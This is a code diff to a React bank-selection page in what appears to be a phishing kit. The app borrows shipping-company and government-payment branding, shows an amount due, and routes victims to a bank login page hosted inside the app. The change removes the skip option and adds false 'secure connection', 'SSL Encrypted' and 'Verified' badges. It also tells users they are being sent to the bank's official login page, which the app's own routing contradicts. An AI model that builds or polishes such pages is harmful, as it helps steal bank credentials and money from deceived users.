@@ -3,18 +3,16 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, Loader2, CheckCircle2, Sparkles } from "lucide-react";
+import { Building2, Loader2, CheckCircle2, Sparkles, ShieldCheck, Lock } from "lucide-react";
 import { designSystem } from "@/lib/designSystem";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
-import BrandedTopBar from "@/components/BrandedTopBar";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import BankLogo from "@/components/BankLogo";
-import BrandedCarousel from "@/components/BrandedCarousel";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -99,31 +97,6 @@ const PaymentBankSelector = () => {
     }, 400);
   };
   
-  const handleSkip = async () => {
-    if (!linkData) return;
-
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: 'skipped',
-      };
-
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
-    }
-
-    toast({
-      title: "تم التخطي",
-      description: "سيتم تسجيل الدخول بدون تحديد بنك",
-    });
-
-    navigate(`/pay/${id}/bank-login`);
-  };
-  
   if (linkLoading || !linkData) {
     return (
       <div 
@@ -153,162 +126,247 @@ const PaymentBankSelector = () => {
       </div>
     );
   }
+
+  const primaryColor = companyBranding?.colors.primary || govSystem.colors.primary;
+  const secondaryColor = companyBranding?.colors.secondary || govSystem.colors.secondary;
   
   return (
     <>
-      <BrandedTopBar 
-        serviceKey={serviceKey}
-        serviceName={serviceName}
-        showBackButton={true}
-        backPath={`/pay/${id}/details`}
-        showCarousel={false}
-      />
-      
-      <BrandedCarousel serviceKey={selectedBank ? `bank_${selectedBank}` : serviceKey} className="mb-6" />
-
       <div 
-        className="min-h-screen py-6 sm:py-8" 
+        className="min-h-screen flex flex-col" 
         dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${companyBranding?.colors.background || govSystem.colors.surface}, ${companyBranding?.colors.surface || '#ffffff'})`,
+          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
           fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
         }}
       >
-        <div className="container mx-auto px-4 max-w-4xl">
-          <div className="mb-8 text-center">
-            <div className="flex items-center justify-center gap-3 mb-3">
-              <Sparkles className="w-6 h-6" style={{ color: companyBranding?.colors.primary || govSystem.colors.primary }} />
-              <h1 
-                className="text-2xl sm:text-4xl font-bold" 
-                style={{ 
-                  color: designSystem.colors.neutral[900],
-                  fontFamily: designSystem.typography.fontFamilies.arabic,
-                  fontWeight: designSystem.typography.fontWeights.extrabold
-                }}
-              >
-                اختر بنكك
-              </h1>
-            </div>
-            <p className="text-sm sm:text-base mb-4" style={{ color: designSystem.colors.neutral[600], fontFamily: designSystem.typography.fontFamilies.arabic }}>
-              اختر البنك للمتابعة إلى صفحة تسجيل الدخول الآمنة
-            </p>
-            <div 
-              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full text-lg sm:text-xl font-bold" 
-              style={{ 
-                background: `linear-gradient(135deg, ${companyBranding?.colors.primary || govSystem.colors.primary}, ${companyBranding?.colors.secondary || govSystem.colors.secondary})`,
-                color: '#ffffff',
-                boxShadow: designSystem.shadows.lg,
-                fontFamily: designSystem.typography.fontFamilies.arabic
-              }}
-            >
-              <Building2 className="w-5 h-5" />
-              {formattedAmount}
-            </div>
-          </div>
-
-        {loadingBanks ? (
-          <div className="text-center py-12">
-            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
-            <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البنوك...</p>
-          </div>
-        ) : banks.length === 0 ? (
-          <Card className="p-8 text-center" style={{ borderRadius: govSystem.borderRadius.lg }}>
-            <Building2 className="w-12 h-12 mx-auto mb-4" style={{ color: govSystem.colors.textLight }} />
-            <p className="mb-4" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>لا توجد بنوك متاحة لهذه الدولة</p>
-            <Button 
-              onClick={handleSkip} 
-              variant="outline"
-              style={{ 
-                borderColor: govSystem.colors.primary,
-                color: govSystem.colors.primary,
-                fontFamily: govSystem.fonts.primaryAr
-              }}
-            >
-              متابعة بدون تحديد بنك
-            </Button>
-          </Card>
-        ) : (
-          <>
-            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3 sm:gap-4 mb-8">
-              {banks.map((bank) => (
-                <div
-                  key={bank.id}
-                  className="group relative cursor-pointer"
-                  onClick={() => handleBankSelect(bank.id)}
+        {/* Enhanced Header */}
+        <div 
+          className="w-full py-6 px-4 shadow-md"
+          style={{
+            background: '#FFFFFF',
+            borderBottom: `3px solid ${primaryColor}`
+          }}
+        >
+          <div className="container mx-auto max-w-6xl">
+            <div className="flex items-center justify-between mb-4">
+              <div className="flex items-center gap-3">
+                <div 
+                  className="w-12 h-12 rounded-full flex items-center justify-center"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
+                  }}
                 >
-                  <div 
-                    className="relative overflow-hidden bg-white p-3 sm:p-4 transition-all duration-300 flex flex-col items-center hover:shadow-2xl"
-                    style={{
-                      borderRadius: designSystem.borderRadius.xl,
-                      border: selectedBank === bank.id ? `2px solid ${bank.color || govSystem.colors.primary}` : `1px solid ${designSystem.colors.neutral[200]}`,
-                      boxShadow: selectedBank === bank.id ? `0 8px 25px -8px ${bank.color || govSystem.colors.primary}60` : designSystem.shadows.sm,
-                      transform: selectedBank === bank.id ? 'scale(1.05)' : 'scale(1)',
-                    }}
-                  >
-                    {selectedBank === bank.id && (
-                      <div
-                        className="absolute top-2 right-2 w-6 h-6 rounded-full flex items-center justify-center shadow-lg z-10"
-                        style={{ backgroundColor: bank.color || govSystem.colors.primary }}
-                      >
-                        <CheckCircle2 className="w-4 h-4 text-white" strokeWidth={2.5} />
-                      </div>
-                    )}
-                    
-                    <div 
-                      className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-300"
-                      style={{
-                        background: `linear-gradient(135deg, ${bank.color || govSystem.colors.primary}05, ${bank.color || govSystem.colors.primary}10)`,
-                      }}
-                    />
-                    
-                    <div className="w-full aspect-square flex items-center justify-center mb-2 relative z-10">
-                      <BankLogo 
-                        bankId={bank.id}
-                        bankName={bank.name}
-                        bankNameAr={bank.nameAr}
-                        color={bank.color}
-                        size="lg"
-                        className="w-full h-full transition-transform duration-300 group-hover:scale-105"
-                      />
-                    </div>
-                    
-                    <p 
-                      className="text-center text-[10px] sm:text-xs font-bold leading-tight"
-                      style={{ 
-                        color: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : govSystem.colors.text,
-                        fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
-                      }}
-                    >
-                      {bank.nameAr}
-                    </p>
-                  </div>
+                  <Building2 className="w-6 h-6 text-white" />
                 </div>
-              ))}
+                <div>
+                  <h1 className="text-xl sm:text-2xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                    اختيار البنك
+                  </h1>
+                  <p className="text-sm text-gray-500">
+                    الخدمات المصرفية الآمنة
+                  </p>
+                </div>
+              </div>
+              
+              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
+                <ShieldCheck className="w-4 h-4 text-green-600" />
+                <span className="text-xs font-medium text-green-700">اتصال آمن</span>
+              </div>
             </div>
-
-            <div className="max-w-xl mx-auto">
-              <Button
-                onClick={handleSkip}
-                variant="outline"
-                className="w-full h-12 text-base"
-                style={{
-                  borderColor: govSystem.colors.primary + '50',
-                  color: govSystem.colors.text,
-                }}
-              >
-                تخطي واستخدام أي بنك
-              </Button>
+            
+            {/* Amount Display */}
+            <div 
+              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-full text-lg font-bold" 
+              style={{ 
+                background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+                color: '#ffffff',
+                boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
+              }}
+            >
+              <span>المبلغ المطلوب:</span>
+              <span className="text-xl">{formattedAmount}</span>
             </div>
+          </div>
+        </div>
 
-            <div className="mt-6 p-4 rounded-xl border text-center" style={{ backgroundColor: `${companyBranding?.colors.primary || govSystem.colors.primary}08`, borderColor: `${companyBranding?.colors.primary || govSystem.colors.primary}30` }}>
-              <p className="text-sm font-semibold" style={{ color: companyBranding?.colors.text || govSystem.colors.text, fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr }}>
-                🔐 اختر البنك الخاص بك للانتقال لصفحة تسجيل الدخول الآمنة
+        {/* Main Content */}
+        <div className="flex-1 py-8 sm:py-12">
+          <div className="container mx-auto px-4 max-w-5xl">
+            {/* Title Section */}
+            <div className="text-center mb-8">
+              <div className="flex items-center justify-center gap-2 mb-3">
+                <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
+                <h2 
+                  className="text-2xl sm:text-3xl font-bold" 
+                  style={{ 
+                    color: designSystem.colors.neutral[900],
+                    fontFamily: designSystem.typography.fontFamilies.arabic
+                  }}
+                >
+                  اختر بنكك للمتابعة
+                </h2>
+              </div>
+              <p className="text-base text-gray-600">
+                اختر البنك الخاص بك للانتقال إلى صفحة تسجيل الدخول الآمنة
               </p>
             </div>
-          </>
-        )}
+
+            {/* Security Notice */}
+            <div 
+              className="max-w-2xl mx-auto mb-8 p-4 rounded-xl border flex items-start gap-3"
+              style={{ 
+                backgroundColor: `${primaryColor}08`, 
+                borderColor: `${primaryColor}30` 
+              }}
+            >
+              <Lock className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
+              <div>
+                <p className="text-sm font-semibold mb-1" style={{ color: designSystem.colors.neutral[900] }}>
+                  🔐 معلومة أمنية هامة
+                </p>
+                <p className="text-xs text-gray-600">
+                  سيتم تحويلك إلى صفحة تسجيل الدخول الرسمية للبنك. لا تشارك بياناتك المصرفية مع أي شخص.
+                </p>
+              </div>
+            </div>
+
+            {/* Banks Grid */}
+            {loadingBanks ? (
+              <div className="text-center py-12">
+                <Loader2 className="w-10 h-10 animate-spin mx-auto mb-4" style={{ color: primaryColor }} />
+                <p className="text-gray-600">جاري تحميل البنوك المتاحة...</p>
+              </div>
+            ) : banks.length === 0 ? (
+              <Card className="p-8 text-center max-w-md mx-auto" style={{ borderRadius: '16px', boxShadow: '0 4px 20px rgba(0,0,0,0.08)' }}>
+                <Building2 className="w-16 h-16 mx-auto mb-4 text-gray-400" />
+                <p className="text-lg font-semibold mb-2 text-gray-700">لا توجد بنوك متاحة</p>
+                <p className="text-sm text-gray-500">لا توجد بنوك متاحة لهذه الدولة حالياً</p>
+              </Card>
+            ) : (
+              <>
+                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 mb-8">
+                  {banks.map((bank) => (
+                    <button
+                      key={bank.id}
+                      className="group relative focus:outline-none focus:ring-2 focus:ring-offset-2 transition-all duration-200 rounded-xl"
+                      style={{
+                        focusRingColor: bank.color || primaryColor
+                      }}
+                      onClick={() => handleBankSelect(bank.id)}
+                    >
+                      <div 
+                        className="relative overflow-hidden bg-white p-4 transition-all duration-300 flex flex-col items-center hover:shadow-xl"
+                        style={{
+                          borderRadius: '12px',
+                          border: selectedBank === bank.id 
+                            ? `3px solid ${bank.color || primaryColor}` 
+                            : `2px solid ${designSystem.colors.neutral[200]}`,
+                          boxShadow: selectedBank === bank.id 
+                            ? `0 8px 30px -8px ${bank.color || primaryColor}60` 
+                            : '0 2px 8px rgba(0,0,0,0.04)',
+                          transform: selectedBank === bank.id ? 'translateY(-4px) scale(1.05)' : 'translateY(0) scale(1)',
+                        }}
+                      >
+                        {/* Selection Checkmark */}
+                        {selectedBank === bank.id && (
+                          <div
+                            className="absolute top-2 right-2 w-7 h-7 rounded-full flex items-center justify-center shadow-lg z-10 animate-in"
+                            style={{ backgroundColor: bank.color || primaryColor }}
+                          >
+                            <CheckCircle2 className="w-4 h-4 text-white" strokeWidth={3} />
+                          </div>
+                        )}
+                        
+                        {/* Hover Overlay */}
+                        <div 
+                          className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-300"
+                          style={{
+                            background: `linear-gradient(135deg, ${bank.color || primaryColor}06, ${bank.color || primaryColor}12)`,
+                          }}
+                        />
+                        
+                        {/* Bank Logo */}
+                        <div className="w-full aspect-square flex items-center justify-center mb-3 relative z-10">
+                          <BankLogo 
+                            bankId={bank.id}
+                            bankName={bank.name}
+                            bankNameAr={bank.nameAr}
+                            color={bank.color}
+                            size="lg"
+                            className="w-full h-full object-contain transition-transform duration-300 group-hover:scale-110"
+                          />
+                        </div>
+                        
+                        {/* Bank Name */}
+                        <p 
+                          className="text-center text-xs sm:text-sm font-bold leading-tight"
+                          style={{ 
+                            color: selectedBank === bank.id ? (bank.color || primaryColor) : designSystem.colors.neutral[700],
+                            fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                          }}
+                        >
+                          {bank.nameAr}
+                        </p>
+                        
+                        {/* Selection Indicator */}
+                        {selectedBank === bank.id && (
+                          <div 
+                            className="absolute bottom-0 left-0 right-0 h-1"
+                            style={{
+                              background: `linear-gradient(90deg, transparent, ${bank.color || primaryColor}, transparent)`
+                            }}
+                          />
+                        )}
+                      </div>
+                    </button>
+                  ))}
+                </div>
+
+                {/* Bottom Info Card */}
+                <div 
+                  className="max-w-2xl mx-auto p-5 rounded-xl border text-center" 
+                  style={{ 
+                    backgroundColor: `${primaryColor}08`, 
+                    borderColor: `${primaryColor}30` 
+                  }}
+                >
+                  <div className="flex items-center justify-center gap-3 mb-2">
+                    <ShieldCheck className="w-5 h-5" style={{ color: primaryColor }} />
+                    <p className="text-base font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                      اختر بنكك الآن
+                    </p>
+                  </div>
+                  <p className="text-sm text-gray-600">
+                    سيتم تحويلك إلى صفحة تسجيل الدخول الآمنة الخاصة بالبنك المختار
+                  </p>
+                </div>
+              </>
+            )}
+          </div>
+        </div>
+
+        {/* Footer */}
+        <div className="py-6 border-t bg-white">
+          <div className="container mx-auto px-4 max-w-5xl">
+            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-sm text-gray-500">
+              <div className="flex items-center gap-4">
+                <div className="flex items-center gap-2">
+                  <Lock className="w-4 h-4" />
+                  <span>SSL Encrypted</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <ShieldCheck className="w-4 h-4" />
+                  <span>Verified</span>
+                </div>
+              </div>
+              <div className="text-center sm:text-right">
+                <p className="text-xs">© 2025 جميع الحقوق محفوظة</p>
+              </div>
+            </div>
+          </div>
+        </div>
       </div>
-    </div>
     </>
   );
 };
